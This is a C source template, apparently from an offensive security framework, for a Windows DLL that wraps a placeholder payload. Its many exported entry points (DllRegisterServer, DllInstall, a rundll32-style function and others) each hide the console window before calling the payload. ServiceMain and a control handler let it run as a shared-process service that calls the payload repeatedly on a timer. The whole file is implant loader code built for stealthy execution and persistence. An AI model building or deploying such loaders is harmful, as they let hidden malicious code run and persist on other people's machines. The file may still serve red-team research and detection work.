// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#define WINVER 0x0501
#define _WIN32_WINNT 0x0501

#define NOMB
#define NOMSG
#define NONLS
#define NOMCX
#define NOIME
#define NOHELP
#define NOCOMM
#define NOICONS
#define NOCRYPT
#define NOKANJI
#define NOSOUND
#define NOCOLOR
#define NOMENUS
#define NOCTLMGR
#define NOSCROLL
#define NODRAWTEXT
#define NOMETAFILE
#define NOPROFILER
#define NOKEYSTATES
#define NORASTEROPS
#define NOCLIPBOARD
#define NOWINSTYLES
#define NOSYSMETRICS
#define NOWINOFFSETS
#define NOSHOWWINDOW
#define NOTEXTMETRIC
#define NOSYSCOMMANDS
#define NOGDICAPMASKS
#define NOWINMESSAGES
#define NODEFERWINDOWPOS
#define NOVIRTUALKEYCODES
#define WIN32_LEAN_AND_MEAN

#define EXPORT __declspec(dllexport)

#include <winsock.h>
#include <windows.h>

#include "flurry.h"

HANDLE G_event;
SERVICE_STATUS_HANDLE G_svc;
SERVICE_STATUS G_status = {
    SERVICE_WIN32_SHARE_PROCESS, SERVICE_START_PENDING,
    SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE
};

DWORD $thread(LPVOID e) {
    while (e == NULL || WaitForSingleObject(e, 0) != 0) {
        $export();
        Sleep($timeout);
    }
    if (e != NULL) {
        CloseHandle(e);
    }
    return 0;
}

EXPORT HRESULT WINAPI VoidFunc() {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $export();
}
EXPORT HRESULT WINAPI DllRegisterServer() {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $export();
}
EXPORT HRESULT WINAPI DllUnregisterServer() {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $export();
}
EXPORT HRESULT WINAPI DllInstall(BOOL b, PCWSTR i) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $export();
}

EXPORT void $funcname(HWND h, HINSTANCE i, LPSTR a, int s) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $export();
}

EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {
    return TRUE;
}

EXPORT DWORD WINAPI HandlerEx(DWORD c, DWORD e, LPVOID d, LPVOID x) {
    switch (c) {
    case SERVICE_CONTROL_STOP:
        G_status.dwCurrentState = SERVICE_STOPPED;
        SetEvent(G_event);
        break;
    case SERVICE_CONTROL_PAUSE:
        G_status.dwCurrentState = SERVICE_PAUSED;
        break;
    case SERVICE_CONTROL_CONTINUE:
        G_status.dwCurrentState = SERVICE_RUNNING;
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        G_status.dwCurrentState = SERVICE_STOPPED;
        SetEvent(G_event);
        break;
    default:
        break;
    }
    SetServiceStatus(G_svc, &G_status);
    return NO_ERROR;
}

EXPORT VOID WINAPI ServiceMain(DWORD n, LPCWSTR* a) {
    G_event = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (G_event == NULL) {
        return;
    }
    G_svc = RegisterServiceCtrlHandlerExW(L"$name", HandlerEx, NULL);
    if (G_svc == NULL) {
        return;
    }
    G_status.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(G_svc, &G_status);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)$thread, G_event, 0, NULL);
    WaitForSingleObject(G_svc, INFINITE);
}
